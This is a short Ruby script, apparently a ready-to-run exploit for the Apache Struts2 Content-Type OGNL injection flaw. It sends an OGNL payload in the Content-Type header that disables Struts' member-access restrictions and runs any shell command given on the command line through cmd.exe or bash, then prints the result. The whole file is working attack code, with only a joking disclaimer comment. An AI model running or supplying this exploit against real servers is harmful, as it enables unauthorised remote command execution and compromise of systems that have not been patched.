#!/usr/bin/ruby  

#coding=utf-8

#coding by Green_m,just for fun,don't do something evil plz.
require 'uri'  
require 'open-uri' 
require 'net/http'

content_type = %q!%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context!
content_type << %q!['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.!
content_type << %q!getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.!
content_type << %q!System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(!
content_type <<%q!#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.!
content_type <<%q!commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}!


content_type.gsub!(/whoami/,ARGV[1]) if ARGV[1]
uri = URI.parse("#{ARGV[0]}")
http = Net::HTTP.new(uri.host, uri.port)
request = Net::HTTP::Post.new(uri.path)

request.add_field("User-Agent" , "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
request.add_field("Content-Type", "#{content_type}")

#http.set_debug_output($stdout)
response = http.request(request)
puts response.body
